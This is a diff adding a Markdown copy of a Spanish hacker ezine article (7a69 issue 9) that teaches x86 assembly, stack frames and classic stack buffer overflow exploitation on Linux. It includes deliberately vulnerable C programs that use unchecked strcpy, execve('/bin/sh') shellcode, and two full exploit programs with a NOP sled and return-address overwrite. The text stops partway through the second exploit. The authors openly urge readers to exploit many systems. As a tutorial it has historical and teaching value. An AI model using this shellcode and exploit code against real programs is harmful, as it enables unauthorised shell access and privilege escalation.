@@ -1,0 +1,1115 @@
+---
+title: "7a69#9-art10"
+ezine: "7a69"
+---
+
+# 7a69#9-art10
+
+**Ezine:** 7a69
+
+<div className="ascii-content">
+
+```
+╔══════════════════════════════╦════════════════════╦═══════════════════════╗
+║         * ARTICULO *         ║      * TEMA *      ║       * NIVEL *       ║
+║──────────────────────────────║────────────────────║───────────────────────║
+║10.- Desvordando el buffer    ║    Programacion    ║     Alto/Muy alto     ║     
+╚══════════════════════════════╩════════════════════╩═══════════════════════╝
+                                                             [ Doing & Ripe ]
+
+NOTA: Este articulo ha estado escrito por Doing y Ripe... Los apartados
+      escritos por cada uno de ellos son:
+
+      Doing: -Algo de ASM
+             -Accesos a memoria
+             -El modo protegido del 386
+             -La pila (o stack)
+             -Alguna instrucciones en ASM
+             -Variables locales
+             -La base de los exploits
+       
+      Ripe: -Esta NOTA :P
+            -Algo sobre los procesos en UNIX
+            -Volvamos al ejemplo anterior
+            -¿Con que aplicaciones chuta todo esto? 
+
+      Esperamos que el articulo sea de vuestro agrado.... y que podais
+      explotar muchos sistemas con vuestros *propios* exploits, happy
+      hacking :)
+
+
+
+INTRODUCCION
+~~~~~~~~~~~~
+
+Hola lectores. En este articulo vamos a intentar explicar detalladamente
+que coño es un buffer overflow o desbordamiento de buffer, asi como la forma
+de explotarlo. Debido a que es un tema que requiere algun conocimiento de
+ensamblador describiremos un poco este lenguaje, lo justo para que se
+entienda lo que vamos a decir. Bueno, sin mas preambulos, vamos alla.
+
+
+ALGO DE ASM
+~~~~~~~~~~~
+
+El asm es un lenguaje mas bien simple, pero con simple me refiero a que
+las cosas que se pueden hacer son simples, como mover un registro en otro,
+hacer una escritura en memoria, etc. Asi que no tiene variables, ni punteros
+ni expresiones logicas, etc... El asm basicamente interactua entre la memoria
+del pc, los registros del procesador y los puertos de E/S. Los registros del
+procesador son los siguientes:
+
+ -EAX, EBX, ECX, EDX. 
+
+Son los registros de proposito general. Se podria decir que se pueden usar
+como variables. El EAX recibe el nombre de acumulador, ademas es el destino
+por defecto de algunas operaciones aritmeticas, como la division.
+
+ -ESI, EDI.
+
+Se usan como punteros indice y destino respectivamente en las operaciones
+de copia de cadenas de caracteres, es decir, cuando vas a copiar, por
+ejemplo, cuatro caracteres de A a B, pues pones en ESI el valor A y en EDI el
+valor B, y ejecutas la instruccion de copiar.
+
+ -EBP, ESP.
+
+Estos registros son algo "especiales". Su utilidad la explicare mas
+adelante.
+
+ -CS, DS, ES, SS.
+
+Estos registros se usan para almacenar la direccion de algun segmento. El
+CS almacena la direccion del segmento que contiene el codigo, el DS almacena
+la del segmento de datos, y el ES es un registro "extra", puedes poner en el
+el valor que se desee. El registro SS contiene la direccion del segmento de
+stack o pila, del que hablare mas adelante.
+
+ -EIP.
+
+El EIP, tambien se le llama contador de programa o instruction pointer.
+Contiene la direccion de la __siguiente__ instruccion a ejecutar.
+
+
+NOTA: Puede que algunos de los lectores conozcan lenguaje ASM en ms-dos. A lo
+      mejor estan confundidos por el cambio de nombre de los registros. En
+      ms-dos, los registros se llamaban ax, bx, cx, etc. Con la aparicion del
+      386 los registros cambiaron su longitud, pasaron de ser de 16 bits a 32
+      bits. Para mantener la compatibilidad en el lenguaje y demas, los
+      registros ax, bx, etc, se pueden seguir usando, pero al registro
+      "grande", al de 32 bits, se le añadio la E de "Extended". Otra cosa;
+      los registros ax, bx, etc... se pueden dividir en dos mas pequeños.
+      llamados ah y al, bx y bl, etc, que hacen referencia a los 8 bits mas
+      altos del registro (ah) y a los 8 mas bajos (al). Un esquema para que
+      os quede mas claro:
+
+                            EAX (32 bits)
+              __________________________________________
+             / 12345678   12345678   12345678   12345678\
+                                     --------   --------
+                                  \ AH (8 bits)  AL (8 bits) /
+                                   -------------------------
+                                          AX (16 bits)
+
+
+ACCESOS A MEMORIA
+~~~~~~~~~~~~~~~~~
+
+Para acceder a memoria se usan dos "numeros", el segmento y el
+desplazamiento (offset). Lo del segmento y el desplazamiento viene de antaño
+y era porque en los primeros ordenadores, con los registros de 16 bits no se
+podia direccionar mucha memoria, asi que se opto por dividir la memoria en
+segmentos:
+
+             Segmento 1: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+             Segmento 0: 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 
+                                 ^
+
+Entonces, para acceder a memoria se usaban dos registros: uno que contenia
+el segmento, y otro el desplazamiento, separados por dos puntos. El 1 de los
+dos segmentos de arriba estaria en la direccion 0:5. Hasta ahora facil, no?
+Esta seria la direccion "virtual" (0:5). Para calcular la direccion que se
+le pasa a la RAM (la direccion _fφsica_) se hace el siguiente calculo:
+
+         Direccion fisica  =  ( segmento * 16 ) + desplazamiento
+
+Bueno, pues un apunte: antes he dicho que EIP contenia la direccion de la
+siguiente direccion a ejecutar no?. Pero acabo de decir que para acceder a 
+memoria hacen falta 2 datos. La direccion del segmento de codigo se encuentra
+en el registro CS. Por lo tanto la direccion de la proxima direccion a 
+ejecutar seria CS:EIP.   
+  
+     
+EL MODO PROTEGIDO DEL 386
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Uno de los grandes avances en sistemas operativos, ha sido el utilizar el
+modo protegido del 386 para funcionar. En los S.O.s antiguos, como ms-dos, 
+solo se podia ejecutar un programa a la vez, o sea, que eran monotarea.
+Ademas ese programa que se estaba ejecutando podia acceder a TODA la memoria.
+Con la llegada de los S.O.s multitarea y multiusuario (como Linux, jeje :) la
+cosa se complico un poco. Ahora se necesitaba correr sobre un mismo
+procesador varios procesos simultaneos, y ademas, esos procesos no podian
+acceder a toda la memoria, si no, se podrian leer los passwords de los
+usuarios desde cualquier programa. 
+
+Pues bien, el modo protegido del 386 nos da la opcion de realizar todo eso.
+En el modo protegido, hay varios tipos de codigo, segun sus privilegios. El
+nivel mas privilegiado es el Ring 0, tambien llamado modo administrador. El
+siguiente nivel es el Ring 1, que tambien es modo administrador pero con
+menos privilegios que el Ring 0, y el Ring 2 idem. El Ring 3 es el ultimo
+tipo de codigo, y es el menos privilegiado. Se le llama modo usuario. En los
+S.O.s actuales solo se usan el Ring 0 y el Ring 3. 
+
+Desde el codigo Ring 0 se puede leer y escribir en toda la memoria. 
+Entonces, que codigo se ejecuta en Ring 0? El kernel, claro. Y en el Ring 3 
+los procesos de usuario. En codigo Ring 3 los accesos a memoria se hacen de
+una forma "algo" distinta. En Ring 3 cuando un proceso quiere acceder a 
+memoria, el procesador "traduce" primero la direccion virtual (segmento + 
+desplazamiento) a una direccion unica, y despues, la __mapea__ a una
+direccion fisica, siguiendo unas tablas que gestiona el kernel, y que son
+unicas e independientes para cada proceso. Estas tablas, se encuentran en
+memoria, y la direccion de ellas se encuentra en el registro de control 3
+( cr3 ) del procesador. No he puesto este registro arriba porque solo puede
+ser modificado por codigo con privilegios Ring 0, o sea, que solo el kernel
+puede modificar las tablas para cada proceso (logico, no?).
+
+Vamos, que un proceso puede estar intentando leer de la posicion de 
+memoria 0xbff8aecd, y resulta que en realidad esta leyendo de la posicion
+0x6666666. Eso solo lo sabe el kernel. Ademas, la memoria que esta mapeada
+a cada proceso va dividida en paginas. Cada pagina tiene sus propios 
+atributos, como lectura, escritura y ejecucion. Si un proceso intenta
+escribir en una pagina de memoria en la que no tiene permisos, el procesaodor
+generara una exepcion al kernel, y este matara al proceso con una señal
+SIGSEV.
+
+Ademas, no toda la memoria esta mapeada a cada proceso, solo la que va a
+usar. Si un proceso trata de acceder a una region de memoria no asignada
+pasa lo mismo de antes (SIGSEV).
+
+Una cosa mas, las llamadas al sistema (syscalls). Cuando un proceso quiere
+abrir un fichero, o mandar una señal a otro, ¿como demonios lo hace? Como no
+puede escribir fuera de su espacio de direcciones, lo que hace es llamar al 
+kernel. Y como lo llama? Mediante una syscall. En linux se usa la
+interrupcion 0x80. Nada mas llamar a esa interrupcion el sistema salta a
+codigo Ring 0, y el kernel mira el reg. EAX, que contiene el indice de la
+syscall. En los registros EBX, ECX, EDX, ESI Y EDI se pasan los parametros
+de la syscall. Cuando el sistema vuelve a codigo Ring 3, el reg. EAX contiene
+el valor que ha devuelto la syscall.
+
+
+LA PILA (O STACK)
+~~~~~~~~~~~~~~~~~
+
+Cuando empeze a hablar del ASM dije que no tenia variables. Pero el ASM
+tiene una region de memoria llamada pila que un programa puede usar para 
+guardar valores, tales como variables locales, direcciones de retorno, etc.
+La pila se encuentra situada en SS:ESP. La pila es una estructura LIFO,
+el primero que entra es el ultimo que sale (Last In, First Out). Para
+guardar un dato en la pila se usa la instruccion push, y para sacar el ultimo
+dato metido en la pila se usa pop. Pongamos un ejemplo:
+
+          CS vale 0 y ESP vale 200.
+
+Nosotros guardamos en la pila el contenido de EAX.
+
+        pushl %eax
+
+Ahora CS sigue valiendo 0, pero ESP vale 196. Si, 196, porque la pila va 
+disminuyendo segun se meten mas valores. Disminuye 4 porque el reg. EAX 
+es un reg. de 32 bits, o sea, 4 bytes.
+
+Ahora guardamos BX.
+
+        pushw %bx
+
+Ahora ESP vale 194. Le restamos 2 porque bx ocupa 2 bytes.
+
+En este momento tenemos 2 valores en la pila. Si hicieramos un pop ahora,
+el valor que obtendriamos seria el del reg. bx, porque ha sido el ultimo en
+meterse.
+
+Mas tarde entrare en detalle sobre las variables locales y direcciones de
+retorno.
+
+
+ALGUNAS INSTRUCCIONES EN ASM
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Antes de nada, en linux, la mayoria de las instrucciones de ASM llevan
+una letra indicando el tamaño del dato o registro sobre el que actuan.
+Estas letras son 3:
+
+        b : byte (8 bits)
+        w : word (16 bits)
+        l : long (32 bits)
+
+Instrucciones:
+
+
+ mov - Mueve un registro a otro, una posicion de memoria a un registro, o
+       un registro a una posicion de memoria.
+
+        movl %eax, %ebx  # Mueve el contenido del registro eax (32 bits) en
+                         # el EBX.
+
+        movb %bh, 4      # Mueve el contenido del registro bh (8 bits) en la
+                         # pos. de memoria 4.
+
+        movw 0x12, %ax   # Mueve 16 bits (2 bytes) desde la pos. de memoria
+                         # 0x12 al reg. ax
+
+Las refencias a memoria puedes ser absolutas, como las de arriba, o bien,
+pueden ir referenciadas a un registro. Pe:
+
+        movl %eax, 0x12(%ebp)  # Mueve el contenido de EAX a la pos. de
+                               # memoria ebp + 0x12
+
+
+ lea - Mete en el segundo operando la direccion de memoria del primero.
+
+        leal 0x8(%ebp), %eax   # Guarda en eax la direccion 0x8 + ebp
+
+ xor - Realiza un xor entre el primer y segundo operando y guarda el
+       resultado en el segundo operando.
+
+        xorl %eax, %ebx  # Guarda en ebx el resultado de eax ^ ebx
+
+ or - Realiza un or entre el primer y segundo operando y guarda el resultado
+      en el segundo operando.
+
+        orl %eax, %ebx  # Guarda en ebx el resultado de eax | ebx
+
+ and - Realiza un and entre el primer y segundo operando y guarda el
+       resultado en el segundo operando.
+
+        andl %eax, %ebx  # Guarda en ebx el resultado de eax & ebx
+
+ int - Lanza una interrupcion
+
+        int $0x80  # Llama a la int 0x80. Notese el signo $
+
+ jmp - Salta a la direccion especificada (relativa)
+
+        jmp 9   # salta 9 bytes por delante de la instruccion actual. 
+
+ call - Llama a la funcion que se encuentra en la direccion especificada 
+        (relativa)
+
+        call 5   # Llama a la funcion que se encuentra 5 bytes por delante de 
+                 # la instruccion actual. 
+
+ inc - Incrementa el operando en 1
+ 
+        inc %ebx # ebx = ebx + 1;
+
+ dec - decrementa el operando en 1
+
+        dec %ecx # ecx = ecx - 1
+
+
+VARIABLES LOCALES
+~~~~~~~~~~~~~~~~~
+
+Cuando se hace un programa en C, hay dos tipos de variables. Estan las 
+variables globales, que se encuentran en el segmento de datos. Y tambien 
+existen unas variables llamadas locales, que se llaman asi porque solo se
+usan en una funcion en concreto, por ejemplo una variable contador. Seria una 
+tonteria definirla como global, si el bucle en el que se va a usar esta en
+una funcion. La pregunta es, ¿donde coño se guardan estas variables? Se
+guardan en la pila. 
+
+
+Y otra cosa muy importante. Hay que entender el concepto de funcion. Un
+programa es simplemente una secuencia de bytes, que el procesador traducira a
+instrucciones que hacen algo. Cuando ejecutas un programa, el kernel lo carga
+en memoria, y le cede el control en su "Program Entry Point", que por norma
+general es el inicio de su funcion main(). Pero como imagino que ya sabreis,
+no se puede hacer todo un programa de forma secuencial, asi que se usan las
+funciones (programacion estructurada). 
+
+Una funcion puede hacer algo tan simple como sumar dos numeros, y devolver
+su resultado. ¿Como coño hace esto? Bien, supongamos que estamos ejecutando 
+nuestro programa. Ahora esta en la instruccion 1. Nuestro programa va a
+llamar a una funcion que suma dos numeros que se le pasan como argumentos.
+Pero, ¿como se le pasan los argumentos? Pues se le pasan por la pila, como
+veis sirve para bastantes cosas. Volvamos al programa. Se encuentra en la 
+instruccion 1, CS vale 1, SS vale 2 y DS vale 3. EBP y ESP valen lo mismo,
+200. Para llamar a la funcion hay que pasarle primero sus dos argumentos.
+Pues para eso usamos sendos push's. 
+
+ 1 push ARG_2
+ 2 push ARG_1  [ Los argumentos se pasan en orden inverso ]
+
+Ahora ESP vale 192 (200 - 4 * 2). Ahora estamos en la inst. 3. En ella esta
+una llamada a la funcion que suma los numeros. 
+
+ 3 call offset_de_la_funcion_sumadora
+
+La pregunta de ahora es, ¿como sabe la funcion sumadora a donde tiene que 
+saltar cuando finalize? Dicho de otra forma: cuando el programa llama a la
+funcion, el programa salta al codigo de la funcion, y cuando esta termina, 
+debe saltar a la inst. nº4, asi que la direccion de la ins. nº4 se debe 
+guardar en algun sitio. ¿Donde? Pues en la pila, coño! xD. 
+
+Cuando se llama a una funcion automaticamente se "pushea" en la pila la
+direccion de la ins. que esta delante de la llamada.
+       
+                   equivale a
+      call 2 ---------------------> pushl direccion_de_la_ins_siguiente
+                                    jmp 2
+
+Ok. Volvamos a nuestro programa. Despues de la llamada, el programa salta al
+codigo de la funcion. Ahora la funcion debe reservar espacio en la pila para
+sus variables locales, acceder a los argumentos que se le han pasado, colocar
+la suma de los args. en EAX y volver a la ins. nº4. ¿Parece dificil, eh? :)
+
+Lo primero que hace es reservar espacio en la pila para sus variables.
+Recordemos como esta la pila en la ins. 1 de la funcion:
+
+ [DIRECCION_DE_LA_INS_4] [ARGUMENTO_1] [ARGUMENTO_2] [??????]
+ ^
+ ESP apunta aqui
+
+
+¿Como podemos reservar espacio para las variables? Si recordais, todavia 
+hay un registro que no he dicho para que sirve, el EBP. ¿A que no adivinais 
+para que sirve? ;->. "reservar" significa conseguir que una region de memoria
+solo sea accesible para lo que nosotros lo "reservamos". Si las variables
+se guardan en la pila, y la pila tambien se usa para un huevo de cosas, ¿como
+se puede reservar espacio? Pues restando un numero a ESP. Por ejemplo, voy a
+reservar 4 bytes en la pila de arriba:
+
+        subl $4, %esp         # le resto 4 a ESP
+
+Entonces la pila queda asi.
+
+ [4_BYTES_RESERVADOS][DIRECCION_DE_LA_INS_4][ARGUMENTO_1][ARGUMENTO_2][???]
+ ^
+ ESP apunta aqui
+
+
+Ahora podemos "pushear" lo que queramos en la pila porque nuestras 
+variables estan delante de ESP, y los datos que "pusheemos" no las 
+sobreescribiran.
+
+Ya tenemos resuelto el problema del espacio, pero todavia queda otro.
+La unica referencia que tenemos para acceder a las variables es el reg. ESP,
+pero ESP se usa para guardar y sacar datos de la pila, asi que puede variar.
+Aqui es donde entra en juego el registro EBP.
+
+Justo antes de restar el espacio a reservar en la pila de ESP, se hace una
+copia de ESP en EBP, de forma que EBP siempre vale lo mismo, y se queda 
+apuntando de la siguiente manera: 
+
+ [4_BYTES_RESERVADOS][DIRECCION_DE_LA_INS_4][ARGUMENTO_1][ARGUMENTO_2][???]
+ ^                   ^
+ ESP apunta aqui     Y EBP apunta aqui
+
+
+Entonces quedamos en que EBP se usa para referenciar las variables locales
+de una funcion, pero, ¿que pasa con el valor de EBP de la funcion llamante? 
+Es decir, la funcion que llama a nuestra funcion sumadora de ejemplo tambien
+tendra sus variables locales, y para referenciarlas le hara falta el reg.
+EBP. ¿Donde lo guarda? Pues si señor, lo has adivinado: en la pila :).
+
+Para aclarar un poco todo esto vamos a hacer nuestro programilla de  ejemplo
+en C y luego lo desemsamblamos. Vamos alla.
+
+***** programa sumador ********
+
+#include &lt;stdio.h>
+
+int suma(int a, int b)
+{
+  int resultado;
+
+  resultado = a + b;
+  
+  return resultado;
+}
+
+void main()
+{
+  suma(1, 2);
+}
+
+*******************************
+
+Lo compilo y despues lo desemsamblo (mis comentarios entre []): 
+
+        # gcc suma.c -o suma
+        # gdb suma
+
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+
+ [ Lo primero que voy a hacer es desemsamblar la funcion main ]
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80483f0 &lt;main>:       push   %ebp
+0x80483f1 &lt;main+1>:     mov    %esp,%ebp
+0x80483f3 &lt;main+3>:     push   $0x2
+0x80483f5 &lt;main+5>:     push   $0x1
+0x80483f7 &lt;main+7>:     call   0x80483c0 &lt;suma>
+0x80483fc &lt;main+12>:    add    $0x8,%esp
+0x80483ff &lt;main+15>:    mov    %ebp,%esp
+0x8048401 &lt;main+17>:    pop    %ebp
+0x8048402 &lt;main+18>:    ret    
+End of assembler dump.
+
+ [ En el programa en C se ve que lo unico que hace la func. main() es
+   llamar a la funcion suma pasandole como parametros los numeros 1 y 2.
+   En las dos primeras lineas:
+
+0x80483f0 &lt;main>:       push   %ebp
+0x80483f1 &lt;main+1>:     mov    %esp,%ebp
+
+   El programa pone en la pila EBP y copia ESP en EBP, como si fuera a
+   reservar espacio para sus variables locales, pero como veis, no tiene, asi
+   que leugo no le resta nada a ESP.
+
+   Despues pone los numeros 1 y 2 en la pila y llama a la funcion suma():
+
+0x80483f3 &lt;main+3>:     push   $0x2
+0x80483f5 &lt;main+5>:     push   $0x1
+0x80483f7 &lt;main+7>:     call   0x80483c0 &lt;suma>
+
+   Y la instruccion:
+
+0x80483fc &lt;main+12>:    add    $0x8,%esp
+
+   Deja ESP como estaba justo antes de pasarle los args. a la func. suma() ]
+
+   [ Ahora desemsamblo suma() ] 
+
+(gdb) disassemble suma
+Dump of assembler code for function suma:
+0x80483c0 &lt;suma>:       push   %ebp       [ Se guarda EBP en la pila ]
+0x80483c1 &lt;suma+1>:     mov    %esp,%ebp  [ Se copia ESP en EBP      ]
+0x80483c3 &lt;suma+3>:     sub    $0x4,%esp  [ Se reservan 4 bytes para la 
+                                            variable resultado       ]
+0x80483c6 &lt;suma+6>:     mov    0x8(%ebp),%eax
+0x80483c9 &lt;suma+9>:     mov    0xc(%ebp),%edx
+0x80483cc &lt;suma+12>:    lea    (%edx,%eax,1),%ecx
+0x80483cf &lt;suma+15>:    mov    %ecx,0xfffffffc(%ebp)
+0x80483d2 &lt;suma+18>:    mov    0xfffffffc(%ebp),%edx
+0x80483d5 &lt;suma+21>:    mov    %edx,%eax
+0x80483d7 &lt;suma+23>:    jmp    0x80483e0 &lt;suma+32>
+0x80483d9 &lt;suma+25>:    lea    0x0(%esi,1),%esi
+0x80483e0 &lt;suma+32>:    mov    %ebp,%esp
+0x80483e2 &lt;suma+34>:    pop    %ebp
+0x80483e3 &lt;suma+35>:    ret    
+0x80483e4 &lt;suma+36>:    lea    0x0(%esi),%esi
+0x80483ea &lt;suma+42>:    lea    0x0(%edi),%edi
+End of assembler dump.
+(gdb) quit
+
+
+
+Espero que llegados a este punto ya entendais mas o menos como va toda la
+movida esta de la pila y las llamadas a funciones. Ahora vamos a entrar en
+detalle en como modificar la parte de la pila que nos interesa desde C.
+
+Tenemos este programa:
+
+******** prueba1.c *************************************
+#include &lt;stdio.h>
+
+int main(int argc, char **argv)
+{
+  unsigned long *ret;
+  char buf[4];
+
+  if (argc > 1) strcpy(buf, argv[1]);
+
+  ret = &ret;
+  ret += 1;
+  printf(" El valor de EBP salvado es : %04x\n", *ret);
+  ret += 1;
+  printf(" La direccion de retorno es : %04x\n", *ret);
+  fflush(stdout);
+
+} 
+*******************************************************
+
+Lo compilamos y lo ejecutamos:
+
+        # gcc prueba1.c -o prueba1
+        # ./prueba1 
+        El valor de EBP salvado es : bffffa28
+        La direccion de retorno es : 40037213
+
+Como podeis ver en el codigo fuente, si hay mas de un argumento el programa
+lo copia en la variable estatica buf, que ocupa 4 bytes, sin mirar el tamaño 
+del argumento. ¿Que pasaria si le pasamos un segundo argumento de entre 4 y 
+ocho bytes? Pues que al hacer el strcpy() sobreescribiria el valor de ret, 
+pero en la siguiente linea se le asigna un valor a ret, asi que no habria 
+mayores consecuencias. Pero si se le pasa un argumento mayor de 8 caracteres 
+se sobreescriben dos valores que tienen todas las funciones en la pila: el 
+valor guardado de EBP y la direccion de retorno:
+
+ [ Voy a pasarle un argumento de 16 bytes de longitud ]
+
+        #./prueba1 aaaaaaaaaaaabbbb
+        El valor de EBP salvado es : 61616161
+        La direccion de retorno es : 62626262
+        Segmentation fault
+
+
+Pues lo que acabais de observar es la base de los desbordamientos de 
+buffer. Al modificar la direccion de retorno, al llegar a la ins. ret de la
+funcion main(), el programa intentara saltar a la direccion 0x62626262, pero
+si recordais, cuando una direccion de memoria no esta mapeada, el kernel mata
+al proceso, y eso es exactamente lo que ha pasado.
+
+
+LA BASE DE LOS EXPLOITS
+~~~~~~~~~~~~~~~~~~~~~~~
+
+¿Que podemos hacer para aprovecharnos de esto? Pues basicamente es esto:
+Vamos a pasarle al programa un argumento, de forma que sobreescriba la
+direccion de retorno con una direccion en la habremos colocado un codigo
+hecho en ensamblador que ejecute lo que nosotros queramos. La direccion en
+la que tiene que estar nuestro codigo _debe_ de estar en el espacio de
+direcciones del programa, asi que, vamos a aprovechar que la variable buf se
+encuentra en su espacio de direcciones, y en los primeros bytes del argumento
+metemos nuestro codigo, y en los cuatro ultimos metemos la direccion de la
+variable buf. La pega es que no sabemos exactamente cual es su direccion, 
+pues depende de la direccion de la pila, pero da la casualidad de que los 
+valores que toma la pila son muy parecidos (en el mismo S.O.), asi que 
+probaremos con la direccion de la pila del programa _exploit_, y si no 
+funciona probaremos a restarle offsets a la dir. hasta encontrar la direccion
+de buf (joder, que frase mas larga :).
+
+Primero vamos con el codigo. ¿Que queremos ejecutar? Pues lo mas comun es
+ejecutar una shell, y desde la shell ejecutar lo que nos salga de los webs.
+Primero vamos a hacer un codigo en ensamblador que ejecute una shell.
+ 
+
+Para ejecutar la shell vamos a hacer una llamada al sistema que le diga al
+kernel que queremos ejecutar algo; evidentemente la unica que nos vale es
+execve(). execve() toma tres argumentos: 
+
+ - puntero a una cadena de caracteres con el path completo del programa a
+   ejecutar.
+ 
+ - Puntero a un array de argumentos terminados en NULL que seran los que se
+   pasen al programa que vamos a ejecutar.
+
+ - Puntero a un array con las variables de entorno.
+
+Ok. Pues con esto ya podemos hacer el codigo en assembler, pero nos falta
+una cosa:
+
+Los punteros apuntan a una direccion de memoria (¡¡NO JODAS!!), pero nosotros
+vamos a tener el codigo en una variable local, asi que desconocemos
+totalmente la direccion de las cadenas de caracteres que pasaremos a
+execve(). ¿Como podemos averiguar su direccion? Pues a alguien muy listo (no
+se quien fue, pero seguro que es muy listo :) se le ocurrio esto:
+
+ - Antes del codigo que llama a execve plantamos un jmp que salte justo
+   detras de la region donde tenemos las strings.
+   (Nota: strings = cadenas de caracteres)
+
+ - La instruccion a la que hemos saltado es un call a la instruccion que esta
+   delante del jmp. O sea, que volvemos a la inst. delante del jmp.
+
+ - ¿Que conseguimos con esto? Si recordais, al hacer un call, se guarda en la 
+   pila la direccion _absoluta_ de la siguiente inst. del call. ¿Y que hay
+   delante del call? Las strings. 
+
+ - Problema resuelto. Ya tenemos en la pila la direccion. Basta con hacer
+   pop %registo_x y tendremos en ese reg. la dir. que buscabamos.
+
+Ah!, se me olvidaba. La mayoria de los desbordamientos de buffer se producen
+al copiar cadenas de caracteres con strcpy(). strcpy() para al encontrar un 0
+en la cadena origen, asi que cuidado con poner 0s en la shellcode. Ademas, si
+la llamada a execve() falla, el programa dara un segmentation fault, asi que
+para evitarlo vamos a añadir una llamada a exit justo despues de la llamada a
+execve().
+
+Para hacer nuestro exploit tenemos que usar un programa vulnerable. Pues ya
+que tenemos el prueba1.c vamos a usarlo (q takaño soi :) Pero vamos a
+aumentar el tamaño de su variable buf a 1024 caracteres para que quepa de
+sobra la shellcode.
+
+Prueba1.c quedaria asi:
+
+******** prueba2.c *************************************
+#include &lt;stdio.h>
+
+int main(int argc, char **argv)
+{
+  unsigned long *ret;
+  char buf[1024];
+
+  if (argc > 1) strcpy(buf, argv[1]);
+
+  ret = &ret;
+  ret += 1;
+  printf(" El valor de EBP salvado es : %04x\n", *ret);
+  ret += 1;
+  printf(" La direccion de retorno es : %04x\n", *ret);
+  fflush(stdout);
+
+} 
+*******************************************************
+
+Y el exploit es este: (comentado por supuesto :)
+
+****** exploit1.c *************************************
+
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;errno.h>
+
+/*
+ * Esta funcion tiene el codigo en asm que usaremos para ejecutar la shell
+ */
+void shell()
+{
+  __asm__("
+       jmp 0x1f                
+       popl %edi                
+       movl %edi,%ebx         
+       xorl %eax,%eax          
+       movb %al,0x7(%edi)       
+       movl %edi,0x8(%edi)      
+       movl %eax,0xc(%edi)      
+       leal 0x8(%edi),%ecx      
+       leal 0xc(%edi),%edx     
+       movb $0xb,%eax         
+       int $0x80               
+       xorl %ebx,%ebx         
+       movl %ebx,%eax           
+       inc %eax                 
+       int $0x80                 
+       call -0x24             
+       .ascii \"/bin/sh0\"      
+       .byte 0x00
+  ");
+}
+
+/*
+ * Puntero al comienzo de la shellcode. Pongo "+ 3" para saltarme las 
+ * instrucciones "push ebp y mov esp, ebp" de la func. shell()
+ */
+char *shellcode = (char*) &shell + 3;
+
+/*
+ * Esta funcion devuelve el valor del reguistro esp
+ */
+unsigned long get_sp()
+{
+  __asm__(" movl %esp, %eax ");
+}
+
+int main(int argc, char **argv)
+{
+  char *args[3];
+  char evil_buf[1036]; 
+  /* 1036 porque = 1024 longitud del buffer + 4 de variable ret +
+  4 de EBP salvado + 4 EIP */
+  unsigned long *lptr;
+  unsigned long ret;
+  int offset = 0;
+
+  printf("Uso:\n");
+  printf("\t%s [offset]\n\n", argv[0]);
+
+  if (argc > 1) offset = atoi(argv[1]);
+  
+  memset(evil_buf, 1, 1032);
+  
+  strncpy(evil_buf, shellcode, strlen(shellcode) - 1);
+  
+  lptr = (unsigned long*) &evil_buf[1032];
+  
+  ret = get_sp() - offset;
+  *lptr = ret;
+  
+  args[0] = "./prueba2";
+  args[1] = evil_buf;
+  args[2] = NULL;
+
+  printf("Explotando...\n");
+  fflush(stdout);
+
+  execve(args[0], args, NULL);
+  
+  perror("execve()");
+}
+
+**************************************************
+
+Ahora compilamos y ejecutamos:
+
+        # gcc prueba2.c -o prueba2
+        # gcc exploit1.c -o exploit1
+        # ./exploit1  
+        Uso:
+        ./exploit [offset]
+
+        Explotando...
+        El valor de EBP salvado es : 1010101
+        La direccion de retorno es : bffff6a4
+        Segmentation fault
+
+Ummm... Parece que no funciona.... No hombre, lo que pasa es que la
+direccion de retorno que usamos no apunta _justo_ al principio de nuestra
+shellcode, asi que tendremos que probar con offsets aleatorios hasta
+encontrar el bueno. Pero como eso o_usas_un_script_o_te_mueres_de_asco pues
+vamos a usar las NOPS. Las NOPS son instrucciones que no hacen nada. Se usan
+para calcular e introducir retardos. Pues nosotros las vamos a usar de la
+siguiente manera:
+
+ - Justo antes del codigo en asm que ejecuta la shell vamos a poner un huevo
+   de nops seguidas, asi, si la direccion de retorno apunta sobre ese rango
+   de NOPS las ira ejecutando todas hasta dar con nuestro codigo, con lo que
+   las posibilidades de encontrar un offset bueno se multiplican
+   considerablemente.
+
+El nuevo exploit es este:
+
+*********** exploit2.c ***************************
+
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;errno.h>
+
+/*
+ * Esta funcion tiene el codigo en asm que usaremos para ejecutar la shell
+ */
+void shell()
+{
+  __asm__("
+       jmp 0x1f                
+       popl %edi                
+       movl %edi,%ebx         
+       xorl %eax,%eax          
+       movb %al,0x7(%edi)       
+       movl %edi,0x8(%edi)      
+       movl %eax,0xc(%edi)      
+       leal 0x8(%edi),%ecx      
+       leal 0xc(%edi),%edx     
+       movb $0xb,%eax         
+       int $0x80               
+       xorl %ebx,%ebx         
+       movl %ebx,%eax           
+       inc %eax                 
+       int $0x80                 
+       call -0x24             
+       .ascii \"/bin/sh0\"      
+       .byte 0x00
+  ");
+}
+
+/*
+ * Puntero al comienzo de la shellcode. Pongo "+ 3" para saltarme las 
+ * instrucciones "push ebp y mov esp, ebp" de la func. shell()
+ */
+char *shellcode = (char*) &shell + 3;
+
+/*
+ * Esta funcion devuelve el valor del reguistro esp
+ */
+unsigned long get_sp()
+{
+  __asm__(" movl %esp, %eax ");
+}
+
+int main(int argc, char **argv)
+{
+  char *args[3];
+  char evil_buf[1036]; 
+  /* 1036 porque = 1024 longitud del buffer + 4 de variable ret +
+  4 de EBP salvado + 4 EIP */
+  unsigned long *lptr;
+  unsigned long ret;
+  int offset = 0;
+
+  printf("Uso:\n");
+  printf("\t%s [offset]\n\n", argv[0]);
+
+  if (argc > 1) offset = atoi(argv[1]);
+  
+  memset(evil_buf, 0x90, 1032);
+  
+  strncpy(evil_buf+1000-strlen(shellcode), shellcode, strlen(shellcode) - 1);
+  
+  lptr = (unsigned long*) &evil_buf[1032];
+  
+  ret = get_sp() - offset;
+  *lptr = ret;
+  
+  args[0] = "./prueba2";
+  args[1] = evil_buf;
+  args[2] = NULL;
+
+  printf("Explotando...\n");
+  fflush(stdout);
+
